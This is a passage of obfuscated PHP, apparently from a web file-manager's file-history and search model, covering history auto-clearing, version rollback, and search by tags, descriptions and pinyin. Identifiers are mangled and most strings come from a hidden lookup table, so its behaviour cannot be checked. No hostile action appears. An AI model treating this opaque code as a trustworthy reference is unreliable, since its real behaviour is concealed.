$_SERVER[‘ÆÜ‘œ]; $ù„ü“å… = array($üÚú´‡[514] => $ö­‹¿ŒÊ[$üÚú´‡[192]], $üÚú´‡[1921] => isset($ö­‹¿ŒÊ[$üÚú´‡[551]]) ? $ö­‹¿ŒÊ[$üÚú´‡[551]] : $ö­‹¿ŒÊ[$üÚú´‡[549]], $üÚú´‡[566] => $ö­‹¿ŒÊ[$üÚú´‡[565]], $üÚú´‡[648] => $ö­‹¿ŒÊ[$üÚú´‡[79]], $üÚú´‡[2388] => $œê¶Ö«¬); if ($GLOBALS[$üÚú´‡[6]][$üÚú´‡[92]][$üÚú´‡[1356]] >= 1) { $this->historyAutoClear($ù„ü“å…[$üÚú´‡[192]]); $this->add($ù„ü“å…); } Hook::trigger($üÚú´‡[2389], $ù„ü“å…); Model($üÚú´‡[2390])->eventFileEdit($ö­‹¿ŒÊ[$üÚú´‡[192]]); } private function historyAutoClear($·À¾¿‘ø) { $öÀüÆÙ´ =& $_SERVER[‘ÆÜ‘œ]; $¼±¾·³ = Model($öÀüÆÙ´[880])->get($öÀüÆÙ´[1378]); $Ã¶“°íÀ = intval($GLOBALS[$öÀüÆÙ´[6]][$öÀüÆÙ´[92]][$öÀüÆÙ´[1356]]); $“éºÍòè = $¼±¾·³ == $öÀüÆÙ´[1379] ? min(5, $Ã¶“°íÀ) : $Ã¶“°íÀ; $“éºÍòè = $“éºÍòè <= 0 ? 0 : $“éºÍòè - 1; if ($“éºÍòè >= 499) { return; } $ÆœÄãôØ = array($öÀüÆÙ´[514] => $·À¾¿‘ø); $óî¸­üç = $this->field($öÀüÆÙ´[2391])->where($ÆœÄãôØ)->order($öÀüÆÙ´[2384])->select(); if (!$óî¸­üç || $“éºÍòè >= count($óî¸­üç)) { return; } $Ô‘¦¡ä³ = array_to_keyvalue($óî¸­üç, $öÀüÆÙ´[12], $öÀüÆÙ´[495]); $Ô‘¦¡ä³ = array_slice($Ô‘¦¡ä³, $“éºÍòè); $È›“öÀÁ = array_to_keyvalue($óî¸­üç, $öÀüÆÙ´[12], $öÀüÆÙ´[565]); $È›“öÀÁ = array_slice($È›“öÀÁ, $“éºÍòè); if (!$Ô‘¦¡ä³ || !$È›“öÀÁ) { return; } $ÆœÄãôØ = array($öÀüÆÙ´[516] => array($öÀüÆÙ´[7], $Ô‘¦¡ä³)); $this->where($ÆœÄãôØ)->delete(); Model($öÀüÆÙ´[568])->remove($È›“öÀÁ); } public function listData($¹™ÆŞÊ) { $ñíÔ…«¿ =& $_SERVER[‘ÆÜ‘œ]; $˜ÓÑ¬ÏÒ = array($ñíÔ…«¿[514] => $¹™ÆŞÊ); $Äèè®Û˜ = $ñíÔ…«¿[2392]; $êû…ŠÆû = $this->field($Äèè®Û˜)->where($˜ÓÑ¬ÏÒ)->order($ñíÔ…«¿[2384])->selectPage(); $this->_listAppendUser($êû…ŠÆû[$ñíÔ…«¿[455]]); $«ÈíÂÁ– = Model($ñíÔ…«¿[880])->get($ñíÔ…«¿[1378]); $ÜŞ‡Ùß» = 5; if ($«ÈíÂÁ– == $ñíÔ…«¿[1379]) { $êû…ŠÆû[$ñíÔ…«¿[455]] = array_slice($êû…ŠÆû[$ñíÔ…«¿[455]], 0, $ÜŞ‡Ùß»); $êû…ŠÆû[$ñíÔ…«¿[452]] = array($ñíÔ…«¿[2393] => 1, $ñíÔ…«¿[2394] => 20, $ñíÔ…«¿[2395] => 1, $ñíÔ…«¿[2396] => count($êû…ŠÆû[$ñíÔ…«¿[455]])); } return $êû…ŠÆû; } protected function _listAppendUser(&$›ÇØº­“) { $´ÅÂÂÂë =& $_SERVER[‘ÆÜ‘œ]; $Ï¾£€ï‚ = array_to_keyvalue($›ÇØº­“, $´ÅÂÂÂë[12], $´ÅÂÂÂë[1544]); $‹êª‚í² = Model($´ÅÂÂÂë[625])->userListInfo($Ï¾£€ï‚); foreach ($›ÇØº­“ as &$âË–¥š) { $À¥¿¨å = $âË–¥š[$´ÅÂÂÂë[1544]]; $âË–¥š[$´ÅÂÂÂë[549]] = $‹êª‚í²[$À¥¿¨å] ? $‹êª‚í²[$À¥¿¨å] : !1; } unset($âË–¥š); } public function fileInfo($°’•ßÃ, $‰âİ¥à™ = false) { $Ø¶¬—£® =& $_SERVER[‘ÆÜ‘œ]; $²î¤ÌÎ = $this->tablePrefix; $å…˜¡ã´ = "{$²î¤ÌÎ}\151\x6f\137\146\151\x6c\145\40\x66\x69\x6c\x65\163\x20\157\x6e\40\x66\151\x6c\x65\163\56\146\151\x6c\145\x49\x44\x20\75\x20\150\x69\163\x74\157\x72\171\x2e\146\151\x6c\x65\x49\104"; $¢£ûøÈÇ = $this->alias($Ø¶¬—£®[2397])->where(array($Ø¶¬—£®[516] => $°’•ßÃ))->join($å…˜¡ã´, $Ø¶¬—£®[2398])->find(); if ($¢£ûøÈÇ && $‰âİ¥à™) { $ŸÆø‡’ö = array($Ø¶¬—£®[192] => $¢£ûøÈÇ[$Ø¶¬—£®[192]], $Ø¶¬—£®[495] => array($Ø¶¬—£®[1131], $°’•ßÃ)); $¢£ûøÈÇ[$Ø¶¬—£®[1817]] = $this->where($ŸÆø‡’ö)->count(); } return $¢£ûøÈÇ; } public function removeItem($œÎ¿”•Ü) { $·ÔØúñã =& $_SERVER[‘ÆÜ‘œ]; $§ê½«©¨ = array($·ÔØúñã[516] => $œÎ¿”•Ü); $Ì¿…“… = $this->where($§ê½«©¨)->find(); if ($Ì¿…“…) { $–Ô¯— = $this->where($§ê½«©¨)->delete(); Model($·ÔØúñã[568])->remove($Ì¿…“…[$·ÔØúñã[565]]); return $–Ô¯—; } return !1; } public function removeBySource($î½ÉåŒĞ) { $ë“¼èòÊ =& $_SERVER[‘ÆÜ‘œ]; if (!$î½ÉåŒĞ) { return !1; } if (!is_array($î½ÉåŒĞ)) { $î½ÉåŒĞ = array($î½ÉåŒĞ); } $–—èÕÏ = array($ë“¼èòÊ[514] => array($ë“¼èòÊ[7], $î½ÉåŒĞ)); $äÉÊ×êÇ = $this->field($ë“¼èòÊ[566])->where($–—èÕÏ)->select(); if ($äÉÊ×êÇ) { $this->where($–—èÕÏ)->delete(); $§øºì¾Õ = array_to_keyvalue($äÉÊ×êÇ, $ë“¼èòÊ[12], $ë“¼èòÊ[565]); Model($ë“¼èòÊ[568])->remove($§øºì¾Õ); } return !0; } public function setDetail($Ñ†Õş¨Í, $Ä–Ã‹¬Õ) { $Üå…ÓŸğ =& $_SERVER[‘ÆÜ‘œ]; return $this->where(array($Üå…ÓŸğ[516] => $Ñ†Õş¨Í))->save(array($Üå…ÓŸğ[2388] => $Ä–Ã‹¬Õ)); } public function rollbackToItem($‰Ï‘’ö, $³ìËÊ•¥) { $ì½µàŞİ =& $_SERVER[‘ÆÜ‘œ]; $¥€î¥ïÚ = Model($ì½µàŞİ[939])->sourceInfo($‰Ï‘’ö); $this->addHistory($¥€î¥ïÚ, LNG($ì½µàŞİ[2399])); $Ã³†‡Ö = $this->find($³ìËÊ•¥); $¯íÆ²Ğ = array($ì½µàŞİ[565] => $Ã³†‡Ö[$ì½µàŞİ[565]], $ì½µàŞİ[79] => $Ã³†‡Ö[$ì½µàŞİ[79]], $ì½µàŞİ[88] => time(), $ì½µàŞİ[551] => USER_ID); Model($ì½µàŞİ[939])->where(array($ì½µàŞİ[192] => $‰Ï‘’ö))->save($¯íÆ²Ğ); return $this->where(array($ì½µàŞİ[516] => $³ìËÊ•¥))->delete(); } public function clearSame($î”Ğ¤âî) { $ŠÙîÆ†ú =& $_SERVER[‘ÆÜ‘œ]; $À»ù¹ãº = $this->listData($î”Ğ¤âî); $•™²Ô­ = array_to_keyvalue_group($À»ù¹ãº, $ŠÙîÆ†ú[565]); $›Á „› = array(); $ß¾¤Õ½¼ = array(); foreach ($•™²Ô­ as $•ä¿¾) { if (!$•ä¿¾ || count($•ä¿¾) <= 1) { continue; } foreach ($•ä¿¾ as $ŠÃüˆ­Ô) { $›Á „›[] = $ŠÃüˆ­Ô[$ŠÙîÆ†ú[565]]; $ß¾¤Õ½¼[] = $ŠÃüˆ­Ô[$ŠÙîÆ†ú[495]]; } } if (!$ß¾¤Õ½¼) { return; } $this->where(array($ŠÙîÆ†ú[495] => array($ŠÙîÆ†ú[7], $ß¾¤Õ½¼)))->delete(); Model($ŠÙîÆ†ú[568])->remove($›Á „›); } public function userSpace() { $´Ş˜À¼ =& $_SERVER[‘ÆÜ‘œ]; $üï„Àñï = $this->tablePrefix; $äğƒÆ• = array($´Ş˜À¼[1921] => USER_ID); $­€çç‹  = "{$üï„Àñï}\151\x6f\x5f\x66\x69\154\x65\x20\x66\151\154\x65\163\x20\x6f\x6e\40\x66\x69\x6c\145\163\56\x66\x69\x6c\x65\x49\x44\x20\x3d\40\150\x69\163\x74\157\162\171\x2e\x66\151\x6c\145\x49\104"; return $this->alias($´Ş˜À¼[2397])->where($äğƒÆ•)->join($­€çç‹ , $´Ş˜À¼[2398])->sum($´Ş˜À¼[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ìò¢–ü) { $‹†™¹÷¼ =& $_SERVER[‘ÆÜ‘œ]; $ÉÉõŠ§§ = KodIO::fileTypeList(); $ıÔƒŒ¦Ó = $ÉÉõŠ§§[$ìò¢–ü]; if (!$ıÔƒŒ¦Ó) { return array(); } $ßİä = $ıÔƒŒ¦Ó[$‹†™¹÷¼[167]]; $Ğ¹Ìúƒõ = $‹†™¹÷¼[7]; if (!$ıÔƒŒ¦Ó[$‹†™¹÷¼[167]]) { $¡·Ñ»å = array_to_keyvalue($ÉÉõŠ§§, $‹†™¹÷¼[12], $‹†™¹÷¼[167]); $ßİä = implode($‹†™¹÷¼[50], $¡·Ñ»å); $Ğ¹Ìúƒõ = $‹†™¹÷¼[2400]; } $–Š®Öä = explode($‹†™¹÷¼[50], trim($ßİä, $‹†™¹÷¼[50])); return array($Ğ¹Ìúƒõ, $–Š®Öä); } public function listPathType($ºô°»ì¥) { $Œô˜‰·¬ =& $_SERVER[‘ÆÜ‘œ]; $şÆáÓ´· = $this->fileTypeWhere($ºô°»ì¥); if (!$şÆáÓ´·) { return array(); } $ä›éÏÊ = USER_ID; $ÖÕµÎ† = Model($Œô˜‰·¬[625])->getInfo($ä›éÏÊ); $«Ì¤  = array($Œô˜‰·¬[678] => SourceModel::TYPE_USER, $Œô˜‰·¬[612] => array($Œô˜‰·¬[643], $Œô˜‰·¬[621] . $ÖÕµÎ†[$Œô˜‰·¬[90]][$Œô˜‰·¬[192]] . $Œô˜‰·¬[644]), $Œô˜‰·¬[679] => $ä›éÏÊ, $Œô˜‰·¬[676] => 0, $Œô˜‰·¬[677] => $şÆáÓ´·); return $this->listSource($«Ì¤ ); } public function listSearch($Ù­›“Ÿ, $¦ÚŞÔÜì = 300) { $±É°¶¡ =& $_SERVER[‘ÆÜ‘œ]; if (isset($Ù­›“Ÿ[$±É°¶¡[2232]]) && $Ù­›“Ÿ[$±É°¶¡[2232]]) { $Ù­›“Ÿ[$±É°¶¡[2232]] = str_replace($±É°¶¡[483], $±É°¶¡[2401], trim($Ù­›“Ÿ[$±É°¶¡[2232]])); } $ìèˆë‰ƒ = $this->_parseSearchWhere($Ù­›“Ÿ); if (!isset($ìèˆë‰ƒ[$±É°¶¡[528]])) { $ìèˆë‰ƒ[$±É°¶¡[528]] = 0; } $ÈõÑí… = $±É°¶¡[2402]; $ÕÈàã¦Ø = $ìèˆë‰ƒ; $¹ÓŸƒçÎ = $ÈõÑí…; $this->_listSearchBindPinyin($Ù­›“Ÿ, $ìèˆë‰ƒ, $ÈõÑí…); $this->alias($±É°¶¡[541])->_makeOrder(); $ìèˆë‰ƒ = $this->parseWhereLike($ìèˆë‰ƒ); $÷éáÜ¹¯ = $this->distinct(!0)->field($ÈõÑí…)->where($ìèˆë‰ƒ)->selectPage($¦ÚŞÔÜì); if ($GLOBALS[$±É°¶¡[6]][$±É°¶¡[477]][$±É°¶¡[478]] && Input::check($Ù­›“Ÿ[$±É°¶¡[2232]], $±É°¶¡[685]) && $÷éáÜ¹¯[$±É°¶¡[452]][$±É°¶¡[438]] == 1 && $÷éáÜ¹¯[$±É°¶¡[452]][$±É°¶¡[453]] == 0) { $÷éáÜ¹¯ = $this->distinct(!0)->field($ÈõÑí…)->where($ÕÈàã¦Ø)->limit(1000)->select(); $÷éáÜ¹¯ = array_page_split($÷éáÜ¹¯, !1, $¦ÚŞÔÜì); } $this->_listSearchFileContent($÷éáÜ¹¯, $Ù­›“Ÿ, $¹ÓŸƒçÎ, $ÕÈàã¦Ø); $this->_listSearchDesc($÷éáÜ¹¯, $Ù­›“Ÿ, $¹ÓŸƒçÎ); $this->_listSearchTag($÷éáÜ¹¯, $Ù­›“Ÿ, $¹ÓŸƒçÎ); $this->_listSearchGroupTag($÷éáÜ¹¯, $Ù­›“Ÿ, $¹ÓŸƒçÎ); $this->_listDataApply($÷éáÜ¹¯[$±É°¶¡[455]]); $this->_listMake($÷éáÜ¹¯); return $÷éáÜ¹¯; } private function _listSearchFileContent(&$ï¾í½€Ù, $ıøü˜íô, $ß›ßÖŸ·, $éßãŠáƒ) { $ÄóÑ•¡ =& $_SERVER[‘ÆÜ‘œ]; if (!$ıøü˜íô[$ÄóÑ•¡[2232]] || $ï¾í½€Ù[$ÄóÑ•¡[452]][$ÄóÑ•¡[438]] > 1) { return; } if (!isset($éßãŠáƒ[$ÄóÑ•¡[32]]) || !is_array($ıøü˜íô[$ÄóÑ•¡[565]])) { return; } $éßãŠáƒ[$ÄóÑ•¡[565]] = array($ÄóÑ•¡[7], $ıøü˜íô[$ÄóÑ•¡[565]]); unset($éßãŠáƒ[$ÄóÑ•¡[32]]); unset($ıøü˜íô[$ÄóÑ•¡[565]]); $¿¨Áã½ = $this->field($ß›ßÖŸ·)->where($éßãŠáƒ)->limit($ÄóÑ•¡[2403])->select(); if (!$¿¨Áã½ || count($¿¨Áã½) == 0) { return; } $ï¾í½€Ù[$ÄóÑ•¡[455]] = array_merge($¿¨Áã½, $ï¾í½€Ù[$ÄóÑ•¡[455]]); $ï¾í½€Ù[$ÄóÑ•¡[452]][$ÄóÑ•¡[453]] += count($¿¨Áã½); } private function _listSearchTag(&$òòÏİÉ, $ÍÀÑëá, $ï²ı‘) { $‹Î‚œÆÛ =& $_SERVER[‘ÆÜ‘œ]; if (empty($ÍÀÑëá[$‹Î‚œÆÛ[2098]]) || !in_array($‹Î‚œÆÛ[2404], $ÍÀÑëá[$‹Î‚œÆÛ[2098]])) { return; } if (!$ÍÀÑëá[$‹Î‚œÆÛ[2232]] || $òòÏİÉ[$‹Î‚œÆÛ[452]][$‹Î‚œÆÛ[438]] > 1) { return; } $¢¥€ëŸ = Model($‹Î‚œÆÛ[2405])->listData(); $¿›À¦¡‘ = array(); $Ğô½¿Ç = $ÍÀÑëá[$‹Î‚œÆÛ[2232]]; foreach ($¢¥€ëŸ as $¿¥Ñò¯É) { $ä³ĞúÊ¬ = $¿¥Ñò¯É[$‹Î‚œÆÛ[32]]; $¶Ú¢Ú³ = str_replace($‹Î‚œÆÛ[53], $‹Î‚œÆÛ[12], Pinyin::get($ä³ĞúÊ¬)); if (stripos($ä³ĞúÊ¬, $Ğô½¿Ç) !== !1 || stripos($¶Ú¢Ú³, $Ğô½¿Ç) !== !1) { $¿›À¦¡‘[] = $¿¥Ñò¯É[$‹Î‚œÆÛ[495]]; } } if (!$¿›À¦¡‘) { return; } $¥šò¡ÑŸ = array($‹Î‚œÆÛ[523] => array($‹Î‚œÆÛ[7], $¿›À¦¡‘), $‹Î‚œÆÛ[1544] => USER_ID); $“ã°±Ş = Model($‹Î‚œÆÛ[525])->field($‹Î‚œÆÛ[87])->where($¥šò¡ÑŸ)->select(); $“ã°±Ş = array_to_keyvalue($“ã°±Ş, $‹Î‚œÆÛ[12], $‹Î‚œÆÛ[87]); $ÜÁº‘•Œ = array_unique($“ã°±Ş); $this->_listSearchMerge($òòÏİÉ, $ÍÀÑëá, $ï²ı‘, $ÜÁº‘•Œ); } private function _listSearchDesc(&$’¿›ãç , $û„—õ›Ö, $»¢Íö«Î) { $ÀÌ³¥ğ =& $_SERVER[‘ÆÜ‘œ]; if (empty($û„—õ›Ö[$ÀÌ³¥ğ[2098]]) || !in_array($ÀÌ³¥ğ[548], $û„—õ›Ö[$ÀÌ³¥ğ[2098]])) { return; } if (!$û„—õ›Ö[$ÀÌ³¥ğ[2232]] || $’¿›ãç [$ÀÌ³¥ğ[452]][$ÀÌ³¥ğ[438]] > 1) { return; } $¼İåã·é = array($ÀÌ³¥ğ[95] => $ÀÌ³¥ğ[548], $ÀÌ³¥ğ[460] => array($ÀÌ³¥ğ[482], $ÀÌ³¥ğ[2234] . $û„—õ›Ö[$ÀÌ³¥ğ[2232]] . $ÀÌ³¥ğ[2234])); $±‹Î©Â = !1; if ($±‹Î©Â) { $áì¤ôÓ© = $this->listSearchChildren($û„—õ›Ö[$ÀÌ³¥ğ[191]]); $áì¤ôÓ© = array_unique($áì¤ôÓ©); if (!$áì¤ôÓ©) { return; } $¼İåã·é[$ÀÌ³¥ğ[192]] = array($ÀÌ³¥ğ[7], $áì¤ôÓ©); } $­ì¤ûŒ° = Model($ÀÌ³¥ğ[480])->field($ÀÌ³¥ğ[192])->where($¼İåã·é)->limit(5000)->select(); $æº§æíÀ = array_to_keyvalue($­ì¤ûŒ°, $ÀÌ³¥ğ[12], $ÀÌ³¥ğ[192]); $this->_listSearchMerge($’¿›ãç , $û„—õ›Ö, $»¢Íö«Î, $æº§æíÀ); } private function _listSearchGroupTag(&$êØŞşï, $«´åÌ’û, $õÂÃí) { $Ì¿š§”Æ =& $_SERVER[‘ÆÜ‘œ]; if (empty($«´åÌ’û[$Ì¿š§”Æ[2098]]) || !in_array($Ì¿š§”Æ[2404], $«´åÌ’û[$Ì¿š§”Æ[2098]])) { return; } if (!$«´åÌ’û[$Ì¿š§”Æ[2232]] || $êØŞşï[$Ì¿š§”Æ[452]][$Ì¿š§”Æ[438]] > 1 || !$«´åÌ’û[$Ì¿š§”Æ[191]]) { return; } $éÛ¸ûĞâ = $this->sourceInfo($«´åÌ’û[$Ì¿š§”Æ[191]]); if (!$éÛ¸ûĞâ || $éÛ¸ûĞâ[$Ì¿š§”Æ[189]] != SourceModel::TYPE_GROUP) { return; } $äü¦ÔŒ­ = $éÛ¸ûĞâ[$Ì¿š§”Æ[597]]; $ÓÛˆ°§ = Model($Ì¿š§”Æ[2406])->get($äü¦ÔŒ­); $ÛúÖÔÅ  = array(); $ì¶İºà = $«´åÌ’û[$Ì¿š§”Æ[2232]]; foreach ($ÓÛˆ°§[$Ì¿š§”Æ[455]] as $•·—ÚÆÍ) { $õàôÇ®® = $•·—ÚÆÍ[$Ì¿š§”Æ[32]]; $¶é“æØó = str_replace($Ì¿š§”Æ[53], $Ì¿š§”Æ[12], Pinyin::get($õàôÇ®®)); if (stripos($õàôÇ®®, $ì¶İºà) !== !1 || stripos($¶é“æØó, $ì¶İºà) !== !1) { $ÛúÖÔÅ [] = $•·—ÚÆÍ[$Ì¿š§”Æ[495]]; } } if (!$ÛúÖÔÅ ) { return; } $ÜÍğÏäá = array($Ì¿š§”Æ[523] => array($Ì¿š§”Æ[7], $ÛúÖÔÅ ), $Ì¿š§”Æ[1544] => 0, $Ì¿š§”Æ[33] => $Ì¿š§”Æ[1442] . $äü¦ÔŒ­); $Œééé = Model($Ì¿š§”Æ[525])->field($Ì¿š§”Æ[87])->where($ÜÍğÏäá)->select(); $Œééé = array_to_keyvalue($Œééé, $Ì¿š§”Æ[12], $Ì¿š§”Æ[87]); $ËÆ±‚èá = array_unique($Œééé); $this->_listSearchMerge($êØŞşï, $«´åÌ’û, $õÂÃí, $ËÆ±‚èá); } private function _listSearchMerge(&$µíÔïù«, $ú¦â¸Ş, $Š¢Ãù‘¹, $‹ÕıÎ¥) { $×¶éèÍÎ =& $_SERVER[‘ÆÜ‘œ]; if (!$‹ÕıÎ¥) { return; } $ÈÎÔ‰ = array_to_keyvalue($µíÔïù«[$×¶éèÍÎ[455]], $×¶éèÍÎ[12], $×¶éèÍÎ[192]); $ É“›Ù¨ = array_diff($‹ÕıÎ¥, $ÈÎÔ‰); if (!$ É“›Ù¨) { return; } $×„ÃÄÕ = array($×¶éèÍÎ[192] => array($×¶éèÍÎ[7], $ É“›Ù¨)); $¼¡£°÷Ú = $this->field($Š¢Ãù‘¹)->where($×„ÃÄÕ)->select(); if (!$¼¡£°÷Ú) { return; } $òÖ“û› = array(); foreach ($¼¡£°÷Ú as $‘¿ò”œ©) { if ($this->_listSearchFilter($‘¿ò”œ©, $ú¦â¸Ş)) { $òÖ“û›[] = $‘¿ò”œ©; } } $µíÔïù«[$×¶éèÍÎ[455]] = array_merge($òÖ“û›, $µíÔïù«[$×¶éèÍÎ[455]]); $µíÔïù«[$×¶éèÍÎ[452]][$×¶éèÍÎ[453]] += count($òÖ“û›); } private function _listSearchFilter($¤®ÛÔá‘, $úÓŸ‘ ‡) { $Ë¸£‚ù€ =& $_SERVER[‘ÆÜ‘œ]; $çß¹ç™™ = $¤®ÛÔá‘[$Ë¸£‚ù€[508]] == $Ë¸£‚ù€[91]; if (!strstr($¤®ÛÔá‘[$Ë¸£‚ù€[612]], $Ë¸£‚ù€[50] . $úÓŸ‘ ‡[$Ë¸£‚ù€[191]] . $Ë¸£‚ù€[50])) { return !1; } if (isset($úÓŸ‘ ‡[$Ë¸£‚ù€[509]]) && $úÓŸ‘ ‡[$Ë¸£‚ù€[509]] != $Ë¸£‚ù€[886]) { if ($úÓŸ‘ ‡[$Ë¸£‚ù€[509]] == $Ë¸£‚ù€[78] && !$çß¹ç™™) { return !1; } if ($úÓŸ‘ ‡[$Ë¸£‚ù€[509]] != $Ë¸£‚ù€[78] && $çß¹ç™™) { return !1; } if (!strstr($¤®ÛÔá‘[$Ë¸£‚ù€[167]], $Ë¸£‚ù€[50] . $úÓŸ‘ ‡[$Ë¸£‚ù€[509]] . $Ë¸£‚ù€[50])) { return !1; } } if (isset($úÓŸ‘ ‡[$Ë¸£‚ù€[2407]]) && $úÓŸ‘ ‡[$Ë¸£‚ù€[2407]] < $¤®ÛÔá‘[$Ë¸£‚ù€[79]]) { return !1; } if (isset($úÓŸ‘ ‡[$Ë¸£‚ù€[2408]]) && $úÓŸ‘ ‡[$Ë¸£‚ù€[2408]] > $¤®ÛÔá‘[$Ë¸£‚ù€[79]]) { return !1; } if (isset($úÓŸ‘ ‡[$Ë¸£‚ù€[692]]) && $úÓŸ‘ ‡[$Ë¸£‚ù€[692]] != $¤®ÛÔá‘[$Ë¸£‚ù€[551]]) { return !1; } return !0; } public function listSearchChildren($ò‰¦¤ûå, $ƒÇÅÊ€ = 5000) { $Çıè¥™Í =& $_SERVER[‘ÆÜ‘œ]; $²­À  = array(); $âı ÊºÜ = $this->sourceInfo($ò‰¦¤ûå); $’ø”¼‡™ = array($Çıè¥™Í[612] => array($Çıè¥™Í[482], $âı ÊºÜ[$Çıè¥™Í[612]] . $âı ÊºÜ[$Çıè¥™Í[192]] . $Çıè¥™Í[644])); $Ø„ŒÖåã = $this->field($Çıè¥™Í[79])->where($’ø”¼‡™)->limit($ƒÇÅÊ€ + 1)->select(); $„Æ“ŸÔñ = is_array($Ø„ŒÖåã) ? count($Ø„ŒÖåã) : 0; if ($„Æ“ŸÔñ > $ƒÇÅÊ€) { return $this->_listSearchChildrenNear($ò‰¦¤ûå, $ƒÇÅÊ€); } $¸ì·¢ªˆ = $this->field($Çıè¥™Í[192])->where($’ø”¼‡™)->select(); $²­À  = array_to_keyvalue($¸ì·¢ªˆ, $Çıè¥™Í[12], $Çıè¥™Í[192]); return $²­À ; } private function _listSearchChildrenNear($à‡©¹ù, $Ñ­ ’‡¨) { $øèşò´ê =& $_SERVER[‘ÆÜ‘œ]; $ˆĞ‹» = array(); $°ÓÕ„²¡ = array($øèşò´ê[191] => $à‡©¹ù); $ÉàŞ‚¥Ä = $this->field($øèşò´ê[2409])->where($°ÓÕ„²¡)->select(); $®½¿çé = array_to_keyvalue(array_filter_by_field($ÉàŞ‚¥Ä, $øèşò´ê[508], $øèşò´ê[91]), $øèşò´ê[12], $øèşò´ê[192]); $ˆĞ‹» = array_merge($ˆĞ‹», array_to_keyvalue($ÉàŞ‚¥Ä, $øèşò´ê[12], $øèşò´ê[192])); if (!$®½¿çé) { return $ˆĞ‹»; } $°ÓÕ„²¡ = array($øèşò´ê[191] => array($øèşò´ê[7], $®½¿çé)); $ÉàŞ‚¥Ä = $this->field($øèşò´ê[2409])->where($°ÓÕ„²¡)->limit($Ñ­ ’‡¨)->select(); $ˆĞ‹» = array_merge($ˆĞ‹», array_to_keyvalue($ÉàŞ‚¥Ä, $øèşò´ê[12], $øèşò´ê[192])); $ˆĞ‹» = array_slice($ˆĞ‹», 0, intval($Ñ­ ’‡¨)); return $ˆĞ‹»; } private function _listSearchBindPinyin($ÄŒè ¾™, &$ÀÌ´ÛŒï, &$Öµ³£óÍ) { $»ëˆ€¡Ô =& $_SERVER[‘ÆÜ‘œ]; if (!isset($ÄŒè ¾™[$»ëˆ€¡Ô[2232]]) || !$ÄŒè ¾™[$»ëˆ€¡Ô[2232]]) { return; } if (!Input::check($ÄŒè ¾™[$»ëˆ€¡Ô[2232]], $»ëˆ€¡Ô[403]) || strlen($ÄŒè ¾™[$»ëˆ€¡Ô[2232]]) < 2) { return; } $ûÕåĞ± = "\114\x45\x46\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\163\157\165\162\x63\x65\x5f\x6d\145\x74\x61\40\x6d\x65\x74\x61\x20\x6f\156\40\x73\157\x75\162\x63\145\56\163\157\165\162\143\x65\x49\x44\x20\x3d\x20\x6d\x65\164\141\x2e\163\157\165\162\x63\145\111\104"; $ˆé¾¬Å× = array(); $Öµ³£óÍ = str_replace(array($»ëˆ€¡Ô[286], $»ëˆ€¡Ô[53], $»ëˆ€¡Ô[2410]), $»ëˆ€¡Ô[12], $Öµ³£óÍ); $Öµ³£óÍ = $»ëˆ€¡Ô[533] . str_replace($»ëˆ€¡Ô[50], $»ëˆ€¡Ô[534], $Öµ³£óÍ); $›¥Ôûµ‡ = $ÀÌ´ÛŒï[$»ëˆ€¡Ô[32]]; unset($ÀÌ´ÛŒï[$»ëˆ€¡Ô[32]]); foreach ($ÀÌ´ÛŒï as $àØé‚İ => $Š£‚‹†) { $ˆé¾¬Å×[$»ëˆ€¡Ô[533] . $àØé‚İ] = $Š£‚‹†; } foreach ($›¥Ôûµ‡ as $•»µØÛÅ) { $ˆé¾¬Å×[] = array($»ëˆ€¡Ô[538] => $•»µØÛÅ, $»ëˆ€¡Ô[1118] => $»ëˆ€¡Ô[2236], array($»ëˆ€¡Ô[2411] => $•»µØÛÅ, $»ëˆ€¡Ô[2412] => array($»ëˆ€¡Ô[7], array($»ëˆ€¡Ô[560], $»ëˆ€¡Ô[559])))); } $this->join($ûÕåĞ±); $ÀÌ´ÛŒï = $ˆé¾¬Å×; } private function _parseSearchWhere($Ñíõöú’) { $Îâ¶µŸœ =& $_SERVER[‘ÆÜ‘œ]; $ÇŒøÁ§€ = array(); if (isset($Ñíõöú’[$Îâ¶µŸœ[868]]) && $Ñíõöú’[$Îâ¶µŸœ[868]]) { $ÇŒøÁ§€[$Îâ¶µŸœ[88]] = array($Îâ¶µŸœ[2413], $Ñíõöú’[$Îâ¶µŸœ[868]]); } if (isset($Ñíõöú’[$Îâ¶µŸœ[869]]) && $Ñíõöú’[$Îâ¶µŸœ[869]]) { $£©ÉÓ¡€ = array($Îâ¶µŸœ[2414], $Ñíõöú’[$Îâ¶µŸœ[869]]); if ($ÇŒøÁ§€[$Îâ¶µŸœ[88]]) { $ÇŒøÁ§€[$Îâ¶µŸœ[88]] = array($ÇŒøÁ§€[$Îâ¶µŸœ[88]], $£©ÉÓ¡€, $Îâ¶µŸœ[2415]); } else { $ÇŒøÁ§€[$Îâ¶µŸœ[88]] = $£©ÉÓ¡€; } } if (isset($Ñíõöú’[$Îâ¶µŸœ[2407]]) && $Ñíõöú’[$Îâ¶µŸœ[2407]] > 0) { $ÇŒøÁ§€[$Îâ¶µŸœ[79]] = array($Îâ¶µŸœ[2413], $Ñíõöú’[$Îâ¶µŸœ[2407]]); } if (isset($Ñíõöú’[$Îâ¶µŸœ[2408]]) && $Ñíõöú’[$Îâ¶µŸœ[2408]]) { $£©ÉÓ¡€ = array($Îâ¶µŸœ[2414], $Ñíõöú’[$Îâ¶µŸœ[2408]]); if ($ÇŒøÁ§€[$Îâ¶µŸœ[79]]) { $ÇŒøÁ§€[$Îâ¶µŸœ[79]] = array($ÇŒøÁ§€[$Îâ¶µŸœ[79]], $£©ÉÓ¡€, $Îâ¶µŸœ[2415]); } else { $ÇŒøÁ§€[$Îâ¶µŸœ[79]] = $£©ÉÓ¡€; } } if (isset($Ñíõöú’[$Îâ¶µŸœ[692]]) && $Ñíõöú’[$Îâ¶µŸœ[692]]) { $ÇŒøÁ§€[] = array($Îâ¶µŸœ[551] => $Ñíõöú’[$Îâ¶µŸœ[692]], $Îâ¶µŸœ[549] => $Ñíõöú’[$Îâ¶µŸœ[692]], $Îâ¶µŸœ[1118] => $Îâ¶µŸœ[2236]); } if (isset($Ñíõöú’[$Îâ¶µŸœ[509]]) && $Ñíõöú’[$Îâ¶µŸœ[509]]) { $‘ì¥ö“‡ = $Ñíõöú’[$Îâ¶µŸœ[509]]; if ($‘ì¥ö“‡ == $Îâ¶µŸœ[78]) { $ÇŒøÁ§€[$Îâ¶µŸœ[508]] = 1; } else { if ($‘ì¥ö“‡ == $Îâ¶µŸœ[2416]) { $ÇŒøÁ§€[$Îâ¶µŸœ[508]] = 0; } else { if 